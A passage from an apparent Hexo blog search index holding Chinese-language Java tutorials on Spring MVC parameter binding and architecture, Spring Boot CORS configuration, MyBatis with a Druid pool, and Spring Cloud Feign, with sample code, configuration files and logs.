json格式对象后台12345678910111213@RequestMapping(value = "introductionData.do", method = &#123;RequestMethod.POST&#125;)@ResponseBodypublic RestResult introductionData(@RequestBody SignData signData) &#123;&#125;public class SignData &#123; private ApplicationInformation applicationInformation; private ApplyUserInformation applyUserInformation; private StudentInformation studentInformation; private List&lt;VolunteerItem&gt; volunteerItems; private ResidencePermit residencePermit; private List&lt;Family&gt; families; //get and set ...&#125; 前台12345678910111213141516171819202122232425262728293031323334353637383940var data = &#123;&#125;var applyUserInformation = &#123; "applyName": APPLYNAME, "applyCardType": "0", "applyCardID": APPLYIDCARD, "applyMobile": APPLYMOBILE&#125;;var applicationInformation = &#123; "live_address": nowaddress, "addressJZArea": addressJZArea, "schoolLevel": schoolLevel, "schoolType": schoolType, "applyName": APPLYNAME, "contacts": contacts, "contactNumber": contactNumber&#125;;var studentInformation = &#123; "cardType": cardType, "cardID": cardID, "studentName": studentName, "studentType": studentType, "studentType1": studentSpecialCase, "isDisability": "0", "studentCategory": "0", "birthday":birthday, "graduationschool":SchoolName, "graduationclass":classNameinfo, "applyName": APPLYNAME&#125;;data["applyUserInformation"] = applyUserInformation;data["applicationInformation"] = applicationInformation;data["studentInformation"] = studentInformation;$.ajax(&#123; url: ctx + '/overseasData.do', type: "post", data: JSON.stringify(data), contentType: "application/json;charset=utf-8", success: function (result) &#123;&#125;&#125;)]]></content>
      <categories>
        <category>spring</category>
      </categories>
      <tags>
        <tag>参数绑定</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SpringMVC入门]]></title>
    <url>%2F2019%2F04%2F28%2FSpringMVC%E5%85%A5%E9%97%A8%2F</url>
    <content type="text"><![CDATA[Spring web mvc介绍Spring web mvc和Struts2都属于表现层的框架,它是Spring框架的一部分,我们可以从Spring的整体结构中看得出来: Web mvc 用户发起request请求至控制器(Controller)控制接收用户请求的数据，委托给模型进行处理 控制器通过模型(Model)处理数据并得到处理结果模型通常是指业务逻辑 控制器将模型数据在视图(View)中展示web中模型无法将数据直接在视图上显示，需要通过控制器完成。如果在C/S应用中模型是可以将数据在视图中展示的。 控制器将视图response响应给用户通过视图展示给用户要的数据或处理结果。 Spring web mvc 架构架构图 用户发送请求至前端控制器DispatcherServlet. DispatcherServlet收到请求调用HandlerMapping处理器映射器. 处理器映射器找到具体的处理器，生成处理器对象及处理器拦截器(如果有则生成)一并返回给DispatcherServlet. DispatcherServlet调用HandlerAdapter处理器适配器. HandlerAdapter经过适配调用具体的处理器(Controller，也叫后端控制器). Controller执行完成返回ModelAndView. HandlerAdapter将controller执行结果ModelAndView返回给DispatcherServlet. DispatcherServlet将ModelAndView传给ViewReslover视图解析器. ViewReslover解析后返回具体View. DispatcherServlet根据View进行渲染视图（即将模型数据填充至视图中）。 DispatcherServlet响应用户 组件说明 DispatcherServlet：作为前端控制器，整个流程控制的中心，控制其它组件执行，统一调度，降低组件之间的耦合性，提高每个组件的扩展性。 HandlerMapping：通过扩展处理器映射器实现不同的映射方式，例如：配置文件方式，实现接口方式，注解方式等。 HandlAdapter：通过扩展处理器适配器，支持更多类型的处理器。 ViewResolver：通过扩展视图解析器，支持更多类型的视图解析，例如：jsp、freemarker、pdf、excel等。 Handler：处理器，即后端控制器用controller表示。 View：视图，即展示给用户的界面，视图中通常需要标签语言展示模型数据。]]></content>
      <categories>
        <category>spring</category>
      </categories>
      <tags>
        <tag>WebMVC</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[项目介绍]]></title>
    <url>%2F2019%2F04%2F28%2F%E9%A1%B9%E7%9B%AE%E4%BB%8B%E7%BB%8D%2F</url>
    <content type="text"><![CDATA[购物商城功能介绍 技术点 亮点 简历 博客 汉诺塔 BP神经网络 科学上网服务器]]></content>
      <categories>
        <category>项目</category>
      </categories>
      <tags>
        <tag>introduction</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[线性分类器]]></title>
    <url>%2F2019%2F03%2F15%2F%E7%BA%BF%E6%80%A7%E5%88%86%E7%B1%BB%E5%99%A8%2F</url>
    <content type="text"><![CDATA[]]></content>
      <categories>
        <category>AI</category>
      </categories>
      <tags>
        <tag>机器学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BP神经网络]]></title>
    <url>%2F2019%2F03%2F15%2FBP%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%2F</url>
    <content type="text"><![CDATA[]]></content>
      <categories>
        <category>AI</category>
      </categories>
      <tags>
        <tag>BP神经网络</tag>
        <tag>机器学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Springboot处理跨域]]></title>
    <url>%2F2019%2F03%2F15%2FSpringboot%E5%A4%84%E7%90%86%E8%B7%A8%E5%9F%9F%2F</url>
    <content type="text"><![CDATA[HTML 5中新增的跨域资源访问（Cross-Origin Resource Sharing）特性可以让我们在开发后端系统的时候决定资源是否允许被跨域访问。所谓跨域指的是域名不同或者端口不同或者协议不同，比如当从mrbrid.cc网站访问mrbird.cc:8080网站资源就会存在跨域问题。Spring从4.2版本开始就提供了跨域的支持，开箱即用。这里介绍如何在Spring Boot开发中解决跨域的问题，主要分为注解驱动和接口编程的方式。 模拟跨域要解决跨域问题，我们就得先模拟一个跨域情景。新建Spring Boot项目，版本为2.1.0.RELEASE，并引如下依赖： 12345678&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-thymeleaf&lt;/artifactId&gt;&lt;/dependency&gt; 项目结构如下所示： 在com.example.demo路径下新建controller包，并创建TestController： 1234567891011121314@Controllerpublic class TestController &#123; @RequestMapping(&quot;index&quot;) public String index () &#123; return &quot;index&quot;; &#125; @RequestMapping(&quot;hello&quot;) @ResponseBody public String hello()&#123; return &quot;hello&quot;; &#125;&#125; 然后在resources/templates下新建index.html： 123456789101112131415161718&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;跨域测试&lt;/title&gt; &lt;script src=&quot;http://libs.baidu.com/jquery/1.11.3/jquery.min.js&quot;&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;div id=&quot;hello&quot;&gt;&lt;/div&gt;&lt;/body&gt;&lt;script&gt; $(function () &#123; $.get(&quot;http://test.mrbird.cc:8080/hello&quot;, function (data) &#123; $(&quot;#hello&quot;).text(data); &#125;) &#125;)&lt;/script&gt;&lt;/html&gt; 编辑本地hosts文件，将你机器IP映射到127.0.0.1上。 启动项目访问http://localhost:8080/，会发现页面并没有成功显示hello，并且F12观察浏览器控制台会发现其报错了。 这是因为我们在http://localhost:8080/域名下试图访问你机器里的hello接口，这就存在跨域问题，接下来我们来解决这个问题。 注解驱动Spring 4.2后提供了@CrossOrigin注解，该注解可以标注于方法或者类上，包含了以下属性: 属性 含义 value 指定所支持域的集合，*表示所有域都支持，默认值为*。这些值对应HTTP请求头中的Access-Control-Allow-Origin origins 同value allowedHeaders 允许请求头中的header，默认都支持 exposedHeaders 响应头中允许访问的header，默认为空 methods 支持请求的方法，比如GET，POST，PUT等，默认和Controller中的方法上标注的一致。 allowCredentials 是否允许cookie随请求发送，使用时必须指定具体的域 maxAge 预请求的结果的有效期，默认30分钟 我们来改造TestController中的hello方法： 123456@RequestMapping(&quot;hello&quot;)@ResponseBody@CrossOrigin(value = &quot;*&quot;)public String hello() &#123; return &quot;hello&quot;;&#125; 表示允许所有域都支持，重启项目，再次访问http://localhost:8080/： 接口编程除了使用@CrossOrigin注解外，我们可以使用接口编程的方式进行统一配置。 在com.example.demo路径下新建config包，然后创建WebConfigurer，实现WebMvcConfigurer，重写addCorsMappings默认实现： 12345678910@Configurationpublic class WebConfigurer implements WebMvcConfigurer &#123; @Override public void addCorsMappings(CorsRegistry registry) &#123; registry.addMapping(&quot;/**&quot;) .allowedOrigins(&quot;*&quot;) .allowedMethods(&quot;GET&quot;); &#125;&#125; 上面配置表示允许所有请求支持跨域访问，并且不限定域，但是支持持GET方法。将hello方法上的@CrossOrigin注解注释掉，重启项目，再次访问http://localhost:8080/，结果也是OK的。 过滤器实现查看官方文档，发现其还提供了基于过滤器的实现方式： 1234567891011@Beanpublic FilterRegistrationBean corsFilter() &#123; UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource(); CorsConfiguration config = new CorsConfiguration(); config.setAllowCredentials(true); config.addAllowedOrigin(&quot;*&quot;); source.registerCorsConfiguration(&quot;/**&quot;, config); FilterRegistrationBean bean = new FilterRegistrationBean(new CorsFilter(source)); bean.setOrder(0); return bean;&#125; Actuator跨域如果项目里集成了Actuator相关功能，其暴露的接口也支持跨域，只需要在配置文件中添加如下配置即可： ENDPOINTS CORS CONFIGURATION 123456management.endpoints.web.cors.allow-credentials= # Whether credentials are supported. When not set, credentials are not supported.management.endpoints.web.cors.allowed-headers= # Comma-separated list of headers to allow in a request. &apos;*&apos; allows all headers.management.endpoints.web.cors.allowed-methods= # Comma-separated list of methods to allow. &apos;*&apos; allows all methods. When not set, defaults to GET.management.endpoints.web.cors.allowed-origins= # Comma-separated list of origins to allow. &apos;*&apos; allows all origins. When not set, CORS support is disabled.management.endpoints.web.cors.exposed-headers= # Comma-separated list of headers to include in a response.management.endpoints.web.cors.max-age=1800s # How long the response from a pre-flight request can be cached by clients. If a duration suffix is not specified, seconds will be used.]]></content>
      <categories>
        <category>springboot</category>
      </categories>
      <tags>
        <tag>跨域</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Springboot整合Mybatis]]></title>
    <url>%2F2019%2F03%2F15%2FSpringboot%E6%95%B4%E5%90%88Mybatis%2F</url>
    <content type="text"><![CDATA[整合MyBatis之前，先搭建一个基本的Spring Boot项目开启Spring Boot。然后引入mybatis-spring-boot-starter和数据库连接驱动（这里使用关系型数据库Oracle 11g）。 mybatis-spring-boot-starter在pom中引入： 12345&lt;dependency&gt; &lt;groupId&gt;org.mybatis.spring.boot&lt;/groupId&gt; &lt;artifactId&gt;mybatis-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;1.3.1&lt;/version&gt;&lt;/dependency&gt; 不同版本的Spring Boot和MyBatis版本对应不一样，具体可查看官方文档：http://www.mybatis.org/spring-boot-starter/mybatis-spring-boot-autoconfigure/。 通过dependency:tree命令查看mybatis-spring-boot-starter都有哪些隐性依赖： 123456789+- org.mybatis.spring.boot:mybatis-spring-boot-starter:jar:1.3.1:compile| +- org.springframework.boot:spring-boot-starter-jdbc:jar:1.5.9.RELEASE:compile| | +- org.apache.tomcat:tomcat-jdbc:jar:8.5.23:compile| | | \- org.apache.tomcat:tomcat-juli:jar:8.5.23:compile| | \- org.springframework:spring-jdbc:jar:4.3.13.RELEASE:compile| | \- org.springframework:spring-tx:jar:4.3.13.RELEASE:compile| +- org.mybatis.spring.boot:mybatis-spring-boot-autoconfigure:jar:1.3.1:compile| +- org.mybatis:mybatis:jar:3.4.5:compile| \- org.mybatis:mybatis-spring:jar:1.3.1:compile 可发现其包含了spring-boot-starter-jdbc依赖，默认使用tomcat-jdbc数据源。 引入ojdbc6由于版权的原因，我们需要将ojdbc6.jar依赖安装到本地的maven仓库，然后才可以在pom中进行配置。 下载ojdbc6.jar文件后，将其放到比较好找的目录下，比如D盘根目录。然后运行以下命令： 123456789101112131415C:\Users\Administrator&gt;mvn install:install-file -Dfile=D:/ojdbc6.jar -DgroupId=com.oracle -DartifactId=ojdbc6 -Dversion=6.0 -Dpackaging=jar -DgeneratePom=true...[INFO] --- maven-install-plugin:2.4:install-file (default-cli) @ standalone-pom ---[INFO] Installing D:\ojdbc6.jar to D:\m2\repository\com\oracle\ojdbc6\6.0\ojdbc6-6.0.jar[INFO] Installing C:\Users\ADMINI~1\AppData\Local\Temp\mvninstall9103688544010617483.pom to D:\m2\repository\com\oracle\ojdbc6\6.0\ojdbc6-6.0.pom[INFO] ------------------------------------------------------------------------[INFO] BUILD SUCCESS[INFO] ------------------------------------------------------------------------[INFO] Total time: 0.940 s[INFO] Finished at: 2017-08-13T15:06:38+08:00[INFO] Final Memory: 6M/145M[INFO] ------------------------------------------------------------------------ 接着在pom中引入： 12345&lt;dependency&gt; &lt;groupId&gt;com.oracle&lt;/groupId&gt; &lt;artifactId&gt;ojdbc6&lt;/artifactId&gt; &lt;version&gt;6.0&lt;/version&gt;&lt;/dependency&gt; 这里的groupid就是你之前安装时指定的-Dgroupid的值，artifactid就是你安装时指定的-Dartifactid的值，version也一样。 Druid数据源Druid是一个关系型数据库连接池，是阿里巴巴的一个开源项目，地址：https://github.com/alibaba/druid。Druid不但提供连接池的功能，还提供监控功能，可以实时查看数据库连接池和SQL查询的工作情况。 配置Druid依赖Druid为Spring Boot项目提供了对应的starter： 12345&lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;druid-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;1.1.6&lt;/version&gt;&lt;/dependency&gt; Druid数据源配置上面通过查看mybatis starter的隐性依赖发现，Spring Boot的数据源配置的默认类型是org.apache.tomcat.jdbc.pool.Datasource，为了使用Druid连接池，需要在application.yml下配置： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263server: context-path: /webspring: datasource: druid: # 数据库访问配置, 使用druid数据源 type: com.alibaba.druid.pool.DruidDataSource driver-class-name: oracle.jdbc.driver.OracleDriver url: jdbc:oracle:thin:@localhost:1521:ORCL username: scott password: 123456 # 连接池配置 initial-size: 5 min-idle: 5 max-active: 20 # 连接等待超时时间 max-wait: 30000 # 配置检测可以关闭的空闲连接间隔时间 time-between-eviction-runs-millis: 60000 # 配置连接在池中的最小生存时间 min-evictable-idle-time-millis: 300000 validation-query: select &apos;1&apos; from dual test-while-idle: true test-on-borrow: false test-on-return: false # 打开PSCache，并且指定每个连接上PSCache的大小 pool-prepared-statements: true max-open-prepared-statements: 20 max-pool-prepared-statement-per-connection-size: 20 # 配置监控统计拦截的filters, 去掉后监控界面sql无法统计, &apos;wall&apos;用于防火墙 filters: stat,wall # Spring监控AOP切入点，如x.y.z.service.*,配置多个英文逗号分隔 aop-patterns: com.springboot.servie.* # WebStatFilter配置 web-stat-filter: enabled: true # 添加过滤规则 url-pattern: /* # 忽略过滤的格式 exclusions: &apos;*.js,*.gif,*.jpg,*.png,*.css,*.ico,/druid/*&apos; # StatViewServlet配置 stat-view-servlet: enabled: true # 访问路径为/druid时，跳转到StatViewServlet url-pattern: /druid/* # 是否能够重置数据 reset-enable: false # 需要账号密码才能访问控制台 login-username: druid login-password: druid123 # IP白名单 # allow: 127.0.0.1 # IP黑名单（共同存在时，deny优先于allow） # deny: 192.168.1.218 # 配置StatFilter filter: stat: log-slow-sql: true 上述配置不但配置了Druid作为连接池，而且还开启了Druid的监控功能。 其他配置可参考官方wiki——https://github.com/alibaba/druid/tree/master/druid-spring-boot-starter 此时，运行项目，访问http://localhost:8080/web/druid： 输入账号密码即可看到Druid监控后台： 关于Druid的更多说明，可查看官方wiki——https://github.com/alibaba/druid/wiki/%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98 使用MyBatis使用的库表： 123456789CREATE TABLE &quot;SCOTT&quot;.&quot;STUDENT&quot; ( &quot;SNO&quot; VARCHAR2(3 BYTE) NOT NULL , &quot;SNAME&quot; VARCHAR2(9 BYTE) NOT NULL , &quot;SSEX&quot; CHAR(2 BYTE) NOT NULL );INSERT INTO &quot;SCOTT&quot;.&quot;STUDENT&quot; VALUES (&apos;001&apos;, &apos;KangKang&apos;, &apos;M &apos;);INSERT INTO &quot;SCOTT&quot;.&quot;STUDENT&quot; VALUES (&apos;002&apos;, &apos;Mike&apos;, &apos;M &apos;);INSERT INTO &quot;SCOTT&quot;.&quot;STUDENT&quot; VALUES (&apos;003&apos;, &apos;Jane&apos;, &apos;F &apos;); 创建对应实体： 1234567public class Student implements Serializable&#123; private static final long serialVersionUID = -339516038496531943L; private String sno; private String name; private String sex; // get,set略&#125; 创建一个包含基本CRUD的StudentMapper： 123456public interface StudentMapper &#123; int add(Student student); int update(Student student); int deleteByIds(String sno); Student queryStudentById(Long id);&#125; StudentMapper的实现可以基于xml也可以基于注解。 使用注解方式继续编辑StudentMapper： 12345678910111213141516171819@Component@Mapperpublic interface StudentMapper &#123; @Insert(&quot;insert into student(sno,sname,ssex) values(#&#123;sno&#125;,#&#123;name&#125;,#&#123;sex&#125;)&quot;) int add(Student student); @Update(&quot;update student set sname=#&#123;name&#125;,ssex=#&#123;sex&#125; where sno=#&#123;sno&#125;&quot;) int update(Student student); @Delete(&quot;delete from student where sno=#&#123;sno&#125;&quot;) int deleteBysno(String sno); @Select(&quot;select * from student where sno=#&#123;sno&#125;&quot;) @Results(id = &quot;student&quot;,value= &#123; @Result(property = &quot;sno&quot;, column = &quot;sno&quot;, javaType = String.class), @Result(property = &quot;name&quot;, column = &quot;sname&quot;, javaType = String.class), @Result(property = &quot;sex&quot;, column = &quot;ssex&quot;, javaType = String.class) &#125;) Student queryStudentBySno(String sno); 简单的语句只需要使用@Insert、@Update、@Delete、@Select这4个注解即可，动态SQL语句需要使用@InsertProvider、@UpdateProvider、@DeleteProvider、@SelectProvider等注解。具体可参考MyBatis官方文档：http://www.mybatis.org/mybatis-3/zh/java-api.html。 使用xml方式使用xml方式需要在application.yml中进行一些额外的配置： 1234567mybatis: # type-aliases扫描路径 # type-aliases-package: # mapper xml实现扫描路径 mapper-locations: classpath:mapper/*.xml property: order: BEFORE 测试接下来编写Service： 123456public interface StudentService &#123; int add(Student student); int update(Student student); int deleteBysno(String sno); Student queryStudentBySno(String sno);&#125; 实现类： 12345678910111213141516171819202122232425@Service(&quot;studentService&quot;)public class StudentServiceImp implements StudentService&#123; @Autowired private StudentMapper studentMapper; @Override public int add(Student student) &#123; return this.studentMapper.add(student); &#125; @Override public int update(Student student) &#123; return this.studentMapper.update(student); &#125; @Override public int deleteBysno(String sno) &#123; return this.studentMapper.deleteBysno(sno); &#125; @Override public Student queryStudentBySno(String sno) &#123; return this.studentMapper.queryStudentBySno(sno); &#125;&#125; 编写controller： 1234567891011@RestControllerpublic class TestController &#123; @Autowired private StudentService studentService; @RequestMapping( value = &quot;/querystudent&quot;, method = RequestMethod.GET) public Student queryStudentBySno(String sno) &#123; return this.studentService.queryStudentBySno(sno); &#125;&#125; 完整的项目目录如下图所示： 启动项目访问：http://localhost:8080/web/querystudent?sno=001： 查看SQL监控情况： 可看到其记录的就是刚刚访问/querystudent得到的SQL。]]></content>
      <categories>
        <category>springboot</category>
      </categories>
      <tags>
        <tag>springboot整合</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Feign]]></title>
    <url>%2F2019%2F03%2F15%2FFeign%2F</url>
    <content type="text"><![CDATA[前面我们分别通过Spring Cloud Ribbon和Spring Cloud Hystrix实现了客户端负载均衡和服务容错，而Spring Cloud Feign不但整合了这两者的功能，而且还提供了一种比Ribbon更简单的服务调用方式 ——— 声明式服务调用。在Spring Cloud Feign中编写服务调用代码非常简单，几乎可以直接将服务提供者的代码复制过来，改为接口即可，下面通过例子来演示这个特性。 搭建Feign Consumer创建一个新的Spring Boot应用，版本为1.5.13.RELEASE，artifactId改为Feign-Consumer，并引入下面这些依赖： 12345678910111213141516171819202122232425&lt;dependencyManagement&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-dependencies&lt;/artifactId&gt; &lt;version&gt;Edgware.SR3&lt;/version&gt; &lt;type&gt;pom&lt;/type&gt; &lt;scope&gt;import&lt;/scope&gt; &lt;/dependency&gt; &lt;/dependencies&gt;&lt;/dependencyManagement&gt;&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-eureka&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-feign&lt;/artifactId&gt; &lt;/dependency&gt;&lt;/dependencies&gt; 除了spring-cloud-starter-feign依赖外，我们还引入了spring-cloud-starter-eureka，目的是为了从Eureka服务注册中心获取服务。 在Spring Boot的入口类中加入@EnableFeignClients和@EnableDiscoveryClient注解，用于开启Spring Cloud Feign和服务注册与发现： 12345678@EnableDiscoveryClient@EnableFeignClients@SpringBootApplicationpublic class DemoApplication &#123; public static void main(String[] args) &#123; SpringApplication.run(DemoApplication.class, args); &#125;&#125; 在前面几节中，我们曾在服务提供者Eureka-Client中定义了一个UserController，代码如下所示： 1234567891011121314151617181920212223242526272829303132333435@RestController@RequestMapping(&quot;user&quot;)public class UserController &#123; private Logger log = LoggerFactory.getLogger(this.getClass()); @GetMapping(&quot;/&#123;id:\\d+&#125;&quot;) public User get(@PathVariable Long id) &#123; log.info(&quot;获取用户id为 &quot; + id + &quot;的信息&quot;); return new User(id, &quot;mrbird&quot;, &quot;123456&quot;); &#125; @GetMapping public List&lt;User&gt; get() &#123; List&lt;User&gt; list = new ArrayList&lt;&gt;(); list.add(new User(1L, &quot;mrbird&quot;, &quot;123456&quot;)); list.add(new User(2L, &quot;scott&quot;, &quot;123456&quot;)); log.info(&quot;获取用户信息 &quot; + list); return list; &#125; @PostMapping public void add(@RequestBody User user) &#123; log.info(&quot;新增用户成功 &quot; + user); &#125; @PutMapping public void update(@RequestBody User user) &#123; log.info(&quot;更新用户成功 &quot; + user); &#125; @DeleteMapping(&quot;/&#123;id:\\d+&#125;&quot;) public void delete(@PathVariable Long id) &#123; log.info(&quot;删除用户成功 &quot; + id); &#125;&#125; 在Spring Cloud Ribbon中访问这些服务需要通过RestTemplate对象来实现，并且参数绑定的过程也比较繁琐。Spring Cloud Feign对这个步骤进行了进一步的封装，在Feign Consumer中调用这些服务只需要定义一个UserService接口，然后将UserController中的代码复制过并将方法体去掉即可，如： 123456789101112131415161718@FeignClient(&quot;Server-Provider&quot;)public interface UserService &#123; @GetMapping(&quot;user/&#123;id&#125;&quot;) public User get(@PathVariable(&quot;id&quot;) Long id); @GetMapping(&quot;user&quot;) public List&lt;User&gt; get(); @PostMapping(&quot;user&quot;) public void add(@RequestBody User user); @PutMapping(&quot;user&quot;) public void update(@RequestBody User user); @DeleteMapping(&quot;user/&#123;id&#125;&quot;) public void delete(@PathVariable(&quot;id&quot;) Long id);&#125; 对比Feign Consumer中的UserService和Eureka-Client中UserController代码，两者是不是很相似？ 在UserService中，我们通过@FeignClient(&quot;Server-Provider&quot;)注解来获取我们需要的服务，其中Server-Provider不区分大小写。需要注意的是，在定义各参数绑定时，@RequestParam、@RequestHeader等可 以指定参数名称的注解，它们的value千万不能少。在SpringMVC 程序中，这些注解会根据参数名来作为默认值，但是在Feign中绑定参数必须通过value属性来指明具体的参数名，不然会抛出illegalStateException异常，value 属性不能为空。 接下来我们在Feign Consumer中定义一个TestController，来调用UserService中定义的服务： 123456789101112131415161718192021222324252627282930313233@RestControllerpublic class TestController &#123; @Autowired private UserService userService; @GetMapping(&quot;user/&#123;id&#125;&quot;) public User getUser(@PathVariable Long id) &#123; return userService.get(id); &#125; @GetMapping(&quot;user&quot;) public List&lt;User&gt; getUsers() &#123; return userService.get(); &#125; @PostMapping(&quot;user&quot;) public void addUser() &#123; User user = new User(1L, &quot;mrbird&quot;, &quot;123456&quot;); userService.add(user); &#125; @PutMapping(&quot;user&quot;) public void updateUser() &#123; User user = new User(1L, &quot;mrbird&quot;, &quot;123456&quot;); userService.update(user); &#125; @DeleteMapping(&quot;user/&#123;id&#125;&quot;) public void deleteUser(@PathVariable Long id) &#123; userService.delete(id); &#125;&#125; 最后配置一下application.yml： 1234567891011server: port: 9000 spring: application: name: Server-Consumer eureka: client: serviceUrl: defaultZone: http://mrbird:123456@peer1:8080/eureka/,http://mrbird:123456@peer2:8081/eureka/ 上面配置指定了Eureka服务注册中心的地址，用于获取服务。 最后我们分别启动以下服务： 启动Eureka-Server集群，端口号为8080和8081； 启动两个Eureka-Client，端口号为8082和8083； 启动Feign-Consumer，端口号为9000。 多次访问http://localhost:9000/user/1服务，观察8082和8083服务的控制台： 12345678910111213142018-06-10 14:27:38.105 INFO 10120 --- [nio-8082-exec-8] c.e.demo.controller.UserController : 获取用户id为 1的信息2018-06-10 14:27:39.989 INFO 10120 --- [nio-8082-exec-7] c.e.demo.controller.UserController : 获取用户id为 1的信息2018-06-10 14:27:41.197 INFO 10120 --- [nio-8082-exec-6] c.e.demo.controller.UserController : 获取用户id为 1的信息2018-06-10 14:27:41.802 INFO 10120 --- [nio-8082-exec-5] c.e.demo.controller.UserController : 获取用户id为 1的信息2018-06-10 14:27:42.224 INFO 10120 --- [nio-8082-exec-4] c.e.demo.controller.UserController : 获取用户id为 1的信息2018-06-10 14:27:42.865 INFO 10120 --- [nio-8082-exec-3] c.e.demo.controller.UserController : 获取用户id为 1的信息2018-06-10 14:27:43.296 INFO 10120 --- [nio-8082-exec-2] c.e.demo.controller.UserController : 获取用户id为 1的信息2018-06-10 14:27:38.358 INFO 9104 --- [nio-8083-exec-8] c.e.demo.controller.UserController : 获取用户id为 1的信息2018-06-10 14:27:40.754 INFO 9104 --- [nio-8083-exec-7] c.e.demo.controller.UserController : 获取用户id为 1的信息2018-06-10 14:27:41.397 INFO 9104 --- [nio-8083-exec-6] c.e.demo.controller.UserController : 获取用户id为 1的信息2018-06-10 14:27:42.006 INFO 9104 --- [nio-8083-exec-5] c.e.demo.controller.UserController : 获取用户id为 1的信息2018-06-10 14:27:42.445 INFO 9104 --- [nio-8083-exec-4] c.e.demo.controller.UserController : 获取用户id为 1的信息2018-06-10 14:27:43.073 INFO 9104 --- [nio-8083-exec-3] c.e.demo.controller.UserController : 获取用户id为 1的信息 使用Feign实现的消费者，依然是利用Ribbon维护了针对Seriver-Provider的服务列表信息，并且通过轮询实现了客户端负载均衡。而与Ribbon不同的是，通过Feign我们只需定义服务绑定接口，以声明式的方法，优雅而简单地实现了服务调用。 Ribbon相关配置Spring Cloud Feign内部的客户端负载均衡是通过Ribbon来实现的，所以在Spring Cloud Feign中配置Ribbon，和之前在Spring Cloud Ribbon客户端负载均衡中介绍的Spring Cloud Ribbon配置一样，这里不再赘述。 Hystrix相关配置要在Spring Cloud Feign中开启Hystrix，可以在yml中添加如下配置： 123feign: hystrix: enabled: true 剩下的Hystrix配置和之前在Spring Cloud Hystrix服务容错中介绍的Hystrix属性配置一样。 在Spring Cloud Feign中配置服务降级和在Spring Cloud Hystrix中配置服务降级区别很大，下面具体来看下怎么在Feign-Consumer中配置服务降级。 定义一个用于处理服务降级方法的类UserServiceFallback，并且实现上面定义的UserService接口： 1234567891011121314151617181920212223242526272829@Componentpublic class UserServiceFallback implements UserService &#123; private Logger log = LoggerFactory.getLogger(this.getClass()); @Override public User get(Long id) &#123; return new User(-1L, &quot;default&quot;, &quot;123456&quot;); &#125; @Override public List&lt;User&gt; get() &#123; return null; &#125; @Override public void add(User user) &#123; log.info(&quot;test fallback&quot;); &#125; @Override public void update(User user) &#123; log.info(&quot;test fallback&quot;); &#125; @Override public void delete(Long id) &#123; log.info(&quot;test fallback&quot;); &#125;&#125; 在UserService的中通过@FeignClient注解的fallback属性来指定对应的服务降级实现类: 1234@FeignClient(value = &quot;Server-Provider&quot;, fallback = UserServiceFallback.class)public interface UserService &#123; ...&#125; 重启Feign-Consumer，并关闭Eureka Client服务，访问http://localhost:9000/user/1，由于Eureka-Client服务提供者都关闭了，所以这里会直接触发服务降级，响应结果如下： 可看到响应信息为服务降级方法中的返回结果。 其余Feign配置除了Ribbon和Hystrix配置之外，Feign也有一些自个儿的配置。 请求压缩Spring Cloud Feign支持对请求与响应进行GZIP压缩，以减少通信过程中的性能损耗： 123456feign: compression: request: enabled: true response: enabled: true 同时，我们还能对请求压缩做一些更细致的设置，比如下面的配置内容指定了压缩的请求数据类型，并设置了请求压缩的大小下限，只有超过这个大小的请求才会对其进行压缩: 123456feign: compression: request: enabled: true mime-types: text/xml,application/xml,application/json min-request-size: 2048 日志配置Feign提供了日志打印的功能，Feign的日志级别分为四种： NONE: 不记录任何信息。 BASIC: 仅记录请求方法、URL以及响应状态码和执行时间。 HEADERS: 除了记录BASIC级别的信息之外，还会记录请求和响应的头信息。 FULL: 记录所有请求与响应的明细，包括头信息、请求体、元数据等。 日志级别默认为NONE，要改变级别可以在入口类中定义一个日志配置Bean： 123456789101112@EnableDiscoveryClient@EnableFeignClients@SpringBootApplicationpublic class DemoApplication &#123; @Bean Logger.Level feignLoggerLevel() &#123; return Logger.Level.FULL; &#125; public static void main(String[] args) &#123; SpringApplication.run(DemoApplication.class, args); &#125;&#125; 然后在yml中配置Feign客户端的日志级别为debug，Feign日志记录仅响应debug级别： 1234567logging: level: com: example: demo: service: UserService: debug 重启项目访问，可以看到控制台打印日志如下： 12345678[UserService#get] &lt;--- HTTP/1.1 200 (506ms)[UserService#get] content-type: application/json;charset=UTF-8[UserService#get] date: Stu, 10 Jun 2018 01:44:45 GMT[UserService#get] transfer-encoding: chunked[UserService#get] [UserService#get] &#123;&quot;id&quot;:1,&quot;username&quot;:&quot;mrbird&quot;,&quot;password&quot;:&quot;123456&quot;&#125;[UserService#get] &lt;--- END HTTP (48-byte body)Flipping property: Server-Provider.ribbon.ActiveConnectionsLimit to use NEXT property: 